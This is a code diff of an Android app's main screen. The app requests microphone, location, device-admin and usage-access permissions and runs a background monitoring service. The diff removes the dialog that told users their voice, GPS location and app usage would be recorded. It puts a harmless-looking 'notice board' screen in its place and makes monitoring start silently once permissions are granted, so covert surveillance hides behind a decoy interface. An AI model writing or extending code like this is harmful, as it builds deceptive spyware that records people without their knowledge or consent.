@@ -3,16 +3,27 @@ package com.company.monitor;
 import android.Manifest;
 import android.app.AlertDialog;
 import android.app.admin.DevicePolicyManager;
+import android.content.BroadcastReceiver;
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.Typeface;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.util.TypedValue;
+import android.view.Gravity;
+import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
+import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
@@ -23,19 +34,39 @@ import com.company.monitor.receivers.AdminReceiver;
 import com.company.monitor.services.MonitoringService;
 import com.company.monitor.utils.PreferenceManager;
 
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int DEVICE_ADMIN_REQUEST_CODE = 200;
-    private EditText etServerUrl, etEmployeeName;
-    private Button btnStartMonitoring;
-    private TextView tvStatus;
+
+    private LinearLayout setupScreen, noticeBoardScreen;
+    private EditText etEmployeeName;
+    private Button btnSubmit;
+    private LinearLayout noticeContainer;
+    private TextView tvNoNotices, tvEmployeeLabel;
+
     private PreferenceManager prefManager;
     private DevicePolicyManager devicePolicyManager;
     private ComponentName adminComponent;
+
+    private final ExecutorService executor = Executors.newSingleThreadExecutor();
+    private final Handler uiHandler = new Handler(Looper.getMainLooper());
+    public static final String ACTION_NEW_NOTICE = "com.company.monitor.NEW_NOTICE";
 
     private String[] REQUIRED_PERMISSIONS = {
         Manifest.permission.RECORD_AUDIO,
@@ -45,8 +76,7 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.FOREGROUND_SERVICE,
         Manifest.permission.FOREGROUND_SERVICE_MICROPHONE,
-        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
-        Manifest.permission.POST_NOTIFICATIONS
+        Manifest.permission.FOREGROUND_SERVICE_LOCATION
     };
 
     @Override
@@ -58,88 +88,64 @@ public class MainActivity extends AppCompatActivity {
         devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         adminComponent = new ComponentName(this, AdminReceiver.class);
 
-        initViews();
-
-        // Block everything until all permissions granted
-        disableUI();
-        showConsentDialog();
-    }
-
-    private void disableUI() {
-        btnStartMonitoring.setEnabled(false);
-        etServerUrl.setEnabled(false);
-        etEmployeeName.setEnabled(false);
-        tvStatus.setText("⛔ Shob permission dite hobe!");
-    }
-
-    private void enableUI() {
-        btnStartMonitoring.setEnabled(true);
-        etServerUrl.setEnabled(true);
-        etEmployeeName.setEnabled(true);
-        tvStatus.setText("✅ All permissions granted! Ready to start.");
-    }
-
-    private void initViews() {
-        etServerUrl    = findViewById(R.id.etServerUrl);
+        setupScreen = findViewById(R.id.setupScreen);
+        noticeBoardScreen = findViewById(R.id.noticeBoardScreen);
         etEmployeeName = findViewById(R.id.etEmployeeName);
-        btnStartMonitoring = findViewById(R.id.btnStartMonitoring);
-        tvStatus       = findViewById(R.id.tvStatus);
+        btnSubmit = findViewById(R.id.btnSubmit);
+        noticeContainer = findViewById(R.id.noticeContainer);
+        tvNoNotices = findViewById(R.id.tvNoNotices);
+        tvEmployeeLabel = findViewById(R.id.tvEmployeeLabel);
 
-        // Load saved prefs
-        String savedUrl = prefManager.getServerUrl();
-        if (savedUrl != null && !savedUrl.isEmpty()) {
-            etServerUrl.setText(savedUrl);
-        }
-        String savedName = prefManager.getEmployeeName();
-        if (savedName != null && !savedName.isEmpty()) {
-            etEmployeeName.setText(savedName);
+        // Listen for real-time notice broadcasts from MonitoringService
+        IntentFilter filter = new IntentFilter(ACTION_NEW_NOTICE);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(noticeReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
         } else {
-            etEmployeeName.setText(Build.MODEL);
+            registerReceiver(noticeReceiver, filter);
         }
 
-        btnStartMonitoring.setOnClickListener(v -> {
-            String url  = etServerUrl.getText().toString().trim();
-            String name = etEmployeeName.getText().toString().trim();
+        // If already set up and service running, go straight to notice board
+        if (prefManager.isServiceRunning()) {
+            showNoticeBoardScreen();
+        } else {
+            showSetupScreen();
+        }
 
-            if (url.isEmpty()) {
-                Toast.makeText(this, "Server URL dite hobe!", Toast.LENGTH_SHORT).show();
+        btnSubmit.setOnClickListener(v -> {
+            String name = etEmployeeName.getText().toString().trim();
+            if (name.isEmpty()) {
+                Toast.makeText(this, "Please enter your name.", Toast.LENGTH_SHORT).show();
                 return;
             }
-            if (name.isEmpty()) {
-                name = Build.MODEL;
-            }
-
-            // Auto-generate device ID from Android ID
+            // Save config and start permission chain
             String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-
-            prefManager.saveConfig(url, deviceId, name);
-            startMonitoringService();
+            prefManager.saveConfig(prefManager.getServerUrl(), deviceId, name);
+            startPermissionChain();
         });
     }
 
-    private void showConsentDialog() {
-        new AlertDialog.Builder(this)
-            .setTitle("Monitoring Notice")
-            .setMessage(
-                "⚠️ IMPORTANT NOTICE\n\n" +
-                "This device will be monitored.\n\n" +
-                "Data collected:\n" +
-                "• Voice/audio recordings\n" +
-                "• Real-time GPS location\n" +
-                "• App usage statistics\n\n" +
-                "You MUST grant ALL permissions to use this app.\n\n" +
-                "By tapping 'I Agree', you consent to this monitoring."
-            )
-            .setPositiveButton("I Agree", (d, w) -> {
-                d.dismiss();
-                startPermissionChain();
-            })
-            .setNegativeButton("Exit", (d, w) -> finish())
-            .setCancelable(false)
-            .show();
+    // ─── Screen switching ───
+
+    private void showSetupScreen() {
+        setupScreen.setVisibility(View.VISIBLE);
+        noticeBoardScreen.setVisibility(View.GONE);
+
+        String savedName = prefManager.getEmployeeName();
+        if (savedName != null && !savedName.isEmpty()) {
+            etEmployeeName.setText(savedName);
+        }
     }
 
-    // ─── STRICT permission chain: step by step, no skip ───
+    private void showNoticeBoardScreen() {
+        setupScreen.setVisibility(View.GONE);
+        noticeBoardScreen.setVisibility(View.VISIBLE);
+
+        String name = prefManager.getEmployeeName();
+        tvEmployeeLabel.setText(name != null && !name.isEmpty() ? name : "");
+        fetchNotices();
+    }
+
+    // ─── Permission chain: step by step ───
 
     private void startPermissionChain() {
         checkAndRequestPermissions();
@@ -167,7 +173,6 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (missing.isEmpty()) {
-            // Step 2: Usage Stats
             checkUsageStatsPermission();
         } else {
             ActivityCompat.requestPermissions(this,
@@ -178,15 +183,14 @@ public class MainActivity extends AppCompatActivity {
     private void checkUsageStatsPermission() {
         if (!hasUsageStatsPermission()) {
             new AlertDialog.Builder(this)
-                .setTitle("⚠️ Usage Access Required")
-                .setMessage("Ei permission MUST dite hobe! Settings e giye enable korun.\n\nNa dile app use korte parben na.")
-                .setPositiveButton("Settings e jao", (d, w) -> {
+                .setTitle("Usage Access Required")
+                .setMessage("This permission is required. Please go to Settings and enable Usage Access for this app.\n\nYou cannot use the app without this permission.")
+                .setPositiveButton("Go to Settings", (d, w) -> {
                     startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                 })
                 .setCancelable(false)
                 .show();
         } else {
-            // Step 3: Device Admin
             checkDeviceAdmin();
         }
     }
@@ -207,19 +211,18 @@ public class MainActivity extends AppCompatActivity {
     private void checkDeviceAdmin() {
         if (!devicePolicyManager.isAdminActive(adminComponent)) {
             new AlertDialog.Builder(this)
-                .setTitle("⚠️ Device Admin Required")
-                .setMessage("Device Admin permission MUST dite hobe!\n\nEta chara app kaj korbe na.")
-                .setPositiveButton("Enable korun", (d, w) -> {
+                .setTitle("Device Admin Required")
+                .setMessage("Device Admin permission is required.\n\nThe app will not work without it.")
+                .setPositiveButton("Enable", (d, w) -> {
                     Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                     intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                     intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Device Admin enable korte hobe. Na korle app use korte parben na.");
+                        "Device Admin must be enabled. The app cannot function without it.");
                     startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE);
                 })
                 .setCancelable(false)
                 .show();
         } else {
-            // Step 4: Battery
             checkBatteryOptimization();
         }
     }
@@ -229,8 +232,8 @@ public class MainActivity extends AppCompatActivity {
             PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
             if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 new AlertDialog.Builder(this)
-                    .setTitle("⚠️ Battery Optimization Off Required")
-                    .setMessage("Background e 100% kaj korar jonno battery optimization off korte MUST hobe!")
+                    .setTitle("Battery Optimization")
+                    .setMessage("To ensure the app works properly in the background, battery optimization must be turned off.")
                     .setPositiveButton("OK", (d, w) -> {
                         Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                         intent.setData(Uri.parse("package:" + getPackageName()));
@@ -246,27 +249,25 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private boolean allPermissionsComplete() {
+        if (!allRuntimePermissionsGranted()) return false;
+        if (!hasUsageStatsPermission()) return false;
+        if (!devicePolicyManager.isAdminActive(adminComponent)) return false;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) return false;
+        }
+        return true;
+    }
+
     private void allPermissionsDone() {
-        enableUI();
-        Toast.makeText(this, "✅ Shob permission granted! Now Start Monitoring e click korun.", Toast.LENGTH_LONG).show();
+        // Auto-start monitoring and show notice board
+        startMonitoringService();
+        showNoticeBoardScreen();
     }
 
     private void startMonitoringService() {
-        // Verify critical permissions before starting
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
-                != PackageManager.PERMISSION_GRANTED) {
-            Toast.makeText(this, "Mic permission dorkar! Permission diye abar try korun.", Toast.LENGTH_LONG).show();
-            ActivityCompat.requestPermissions(this,
-                new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSION_REQUEST_CODE);
-            return;
-        }
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-                != PackageManager.PERMISSION_GRANTED) {
-            Toast.makeText(this, "Location permission dorkar! Permission diye abar try korun.", Toast.LENGTH_LONG).show();
-            ActivityCompat.requestPermissions(this,
-                new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CODE);
-            return;
-        }
+        if (prefManager.isServiceRunning()) return;
 
         Intent serviceIntent = new Intent(this, MonitoringService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -275,17 +276,15 @@ public class MainActivity extends AppCompatActivity {
             startService(serviceIntent);
         }
         prefManager.setServiceRunning(true);
-        tvStatus.setText("✅ Monitoring Active – Service running in background");
-        btnStartMonitoring.setEnabled(false);
-        Toast.makeText(this, "Monitoring shuru hoyeche!", Toast.LENGTH_LONG).show();
     }
+
+    // ─── Permission callbacks ───
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Check if any were denied
             boolean allGranted = true;
             for (int result : grantResults) {
                 if (result != PackageManager.PERMISSION_GRANTED) {
@@ -295,28 +294,18 @@ public class MainActivity extends AppCompatActivity {
             }
 
             if (!allGranted) {
-                // Check if permanently denied - send to App Settings
-                boolean anyPermanentlyDenied = false;
-                for (String perm : permissions) {
-                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
-                        anyPermanentlyDenied = true;
-                        break;
-                    }
-                }
-
                 new AlertDialog.Builder(this)
-                    .setTitle("⛔ Permission Denied!")
-                    .setMessage("SHOB permission dite MUST hobe!\n\nNa dile app use korte parben na.\n\nAbar try korun.")
-                    .setPositiveButton("Abar try kori", (d, w) -> checkAndRequestPermissions())
-                    .setNeutralButton("App Settings", (d, w) -> {
+                    .setTitle("Permission Required")
+                    .setMessage("All permissions are required to use this app.\n\nPlease grant all permissions from App Settings.")
+                    .setPositiveButton("Open App Settings", (d, w) -> {
                         Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                         intent.setData(Uri.parse("package:" + getPackageName()));
                         startActivity(intent);
                     })
+                    .setNegativeButton("Try Again", (d, w) -> checkAndRequestPermissions())
                     .setCancelable(false)
                     .show();
             } else {
-                // All runtime permissions granted, continue chain
                 checkUsageStatsPermission();
             }
         }
@@ -327,14 +316,12 @@ public class MainActivity extends AppCompatActivity {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
-                Toast.makeText(this, "✅ Device Admin activated!", Toast.LENGTH_SHORT).show();
                 checkBatteryOptimization();
             } else {
-                // Not activated - force again
                 new AlertDialog.Builder(this)
-                    .setTitle("⛔ Device Admin Required!")
-                    .setMessage("Device Admin MUST enable korte hobe!\n\nNa korle app use korte parben na.")
-                    .setPositiveButton("Abar try kori", (d, w) -> checkDeviceAdmin())
+                    .setTitle("Device Admin Required")
+                    .setMessage("Device Admin must be enabled.\n\nYou cannot use the app without it.")
+                    .setPositiveButton("Try Again", (d, w) -> checkDeviceAdmin())
                     .setCancelable(false)
                     .show();
             }
@@ -344,29 +331,145 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onResume() {
         super.onResume();
-        // Re-check entire permission chain when returning from Settings
+
+        // If already running, stay on notice board
         if (prefManager.isServiceRunning()) {
-            tvStatus.setText("✅ Monitoring Active – Service running in background");
-            btnStartMonitoring.setEnabled(false);
-            etServerUrl.setEnabled(false);
-            etEmployeeName.setEnabled(false);
+            showNoticeBoardScreen();
             return;
         }
 
-        // Check if all permissions are now granted
-        if (allRuntimePermissionsGranted() && hasUsageStatsPermission()
-                && devicePolicyManager.isAdminActive(adminComponent)) {
-            // Check battery too
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-                if (pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                    allPermissionsDone();
-                    return;
-                }
-            } else {
+        // If returning from Settings, check if all permissions now complete
+        if (setupScreen.getVisibility() == View.VISIBLE) {
+            String name = etEmployeeName.getText().toString().trim();
+            if (!name.isEmpty() && allPermissionsComplete()) {
+                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                prefManager.saveConfig(prefManager.getServerUrl(), deviceId, name);
                 allPermissionsDone();
-                return;
+            } else if (!name.isEmpty() && allRuntimePermissionsGranted()) {
+                // Continue the chain from where it left off
+                if (!hasUsageStatsPermission()) {
+                    checkUsageStatsPermission();
+                } else if (!devicePolicyManager.isAdminActive(adminComponent)) {
+                    checkDeviceAdmin();
+                } else {
+                    checkBatteryOptimization();
+                }
             }
         }
+
+        fetchNotices();
+    }
+
+    // ─── Notice Board ───
+
+    private final BroadcastReceiver noticeReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            fetchNotices();
+        }
+    };
+
+    private void fetchNotices() {
+        String serverUrl = prefManager.getServerUrl();
+        if (serverUrl == null || serverUrl.isEmpty()) return;
+
+        executor.execute(() -> {
+            try {
+                URL url = new URL(serverUrl + "/api/notices");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+
+                if (conn.getResponseCode() == 200) {
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                    StringBuilder sb = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) sb.append(line);
+                    reader.close();
+
+                    JSONArray arr = new JSONArray(sb.toString());
+                    uiHandler.post(() -> displayNotices(arr));
+                }
+                conn.disconnect();
+            } catch (Exception e) {
+                // Silently ignore network errors
+            }
+        });
+    }
+
+    private void displayNotices(JSONArray notices) {
+        noticeContainer.removeAllViews();
+
+        if (notices.length() == 0) {
+            TextView empty = new TextView(this);
+            empty.setText("No notices yet");
+            empty.setGravity(Gravity.CENTER);
+            empty.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
+            empty.setTextColor(Color.parseColor("#999999"));
+            empty.setPadding(0, dp(40), 0, dp(40));
+            noticeContainer.addView(empty);
+            return;
+        }
+
+        SimpleDateFormat sdf = new SimpleDateFormat("MMM dd, yyyy  hh:mm a", Locale.ENGLISH);
+
+        for (int i = 0; i < notices.length(); i++) {
+            try {
+                JSONObject n = notices.getJSONObject(i);
+                String title = n.getString("title");
+                String message = n.getString("message");
+                String createdAt = n.optString("createdAt", "");
+
+                LinearLayout card = new LinearLayout(this);
+                card.setOrientation(LinearLayout.VERTICAL);
+                card.setBackgroundColor(Color.parseColor("#FFFFFF"));
+                card.setPadding(dp(16), dp(14), dp(16), dp(14));
+                LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+                cardParams.setMargins(0, 0, 0, dp(10));
+                card.setLayoutParams(cardParams);
+
+                TextView tvTitle = new TextView(this);
+                tvTitle.setText("📌 " + title);
+                tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
+                tvTitle.setTypeface(null, Typeface.BOLD);
+                tvTitle.setTextColor(Color.parseColor("#1A237E"));
+                card.addView(tvTitle);
+
+                TextView tvMsg = new TextView(this);
+                tvMsg.setText(message);
+                tvMsg.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
+                tvMsg.setTextColor(Color.parseColor("#333333"));
+                tvMsg.setPadding(0, dp(8), 0, 0);
+                card.addView(tvMsg);
+
+                if (!createdAt.isEmpty()) {
+                    try {
+                        Date date = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.ENGLISH).parse(createdAt.substring(0, 19));
+                        TextView tvDate = new TextView(this);
+                        tvDate.setText(sdf.format(date));
+                        tvDate.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
+                        tvDate.setTextColor(Color.parseColor("#999999"));
+                        tvDate.setPadding(0, dp(8), 0, 0);
+                        card.addView(tvDate);
+                    } catch (Exception ignored) {}
+                }
+
+                noticeContainer.addView(card);
+            } catch (Exception ignored) {}
+        }
+    }
+
+    private int dp(int value) {
+        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value,
+            getResources().getDisplayMetrics());
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        try { unregisterReceiver(noticeReceiver); } catch (Exception ignored) {}
+        executor.shutdown();
     }
 }
